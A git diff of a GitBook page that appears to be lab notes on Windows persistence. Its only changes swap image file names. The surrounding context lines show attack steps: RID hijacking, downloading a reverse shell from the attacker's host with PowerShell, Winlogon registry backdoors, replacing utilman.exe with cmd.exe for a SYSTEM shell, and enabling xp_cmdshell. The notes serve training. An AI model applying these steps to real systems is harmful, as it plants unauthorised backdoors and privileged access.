@@ -190,7 +190,7 @@ Notice the RID is stored using little-endian notation, so its bytes appear rever
 
 We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>
 
 The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.
 
@@ -347,7 +347,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 </strong><strong>sc.exe start THMservice2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
@@ -373,7 +373,7 @@ You should be able to find a stopped service called THMService3. To query the se
 sc.exe qc THMService3
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 There are three things we care about when using a service for persistence:
 
@@ -542,7 +542,7 @@ Now be sure to sign out of your session from the start menu (closing the RDP win
 
 And log back via RDP. You should immediately receive a connection back to your attacker's machine.
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 ### Run / RunOnceYou can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
 
@@ -654,7 +654,7 @@ Note: While both `shell` and `Userinit` could be used to achieve persistence in 
 <pre><code><strong>C:\tools\pstools\PsExec64.exe -i -s regedit
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
 
 Add: C:\Windows\revshell.exe
 
@@ -662,7 +662,7 @@ Add: C:\Windows\revshell.exe
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Logon scripts
 
@@ -711,7 +711,7 @@ To create an environment variable for a user, you can go to its `HKCU\Environmen
 <pre><code><strong>regedit
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
 
@@ -793,7 +793,7 @@ You should now be able to press `SHIFT` five times to access a terminal with SYS
 
 Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen.
 
-<figure><img src="../../.gitbook/assets/image (4) (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -811,11 +811,11 @@ icacls C:\Windows\System32\utilman.exe /grant Administrator:F
 copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 To trigger our terminal, we will lock our screen from the start button.
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>
 
 And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges.
 
@@ -874,7 +874,7 @@ To enable it, let's open `Microsoft SQL Server Management Studio 18`, available 
 
 Once logged in, click on the New Query button to open the query editor:
 
-<figure><img src="../../.gitbook/assets/image (3) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
 
@@ -955,4 +955,4 @@ With all that ready, let's navigate to `http://$VICTIM/` and insert an employee 
 
 
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
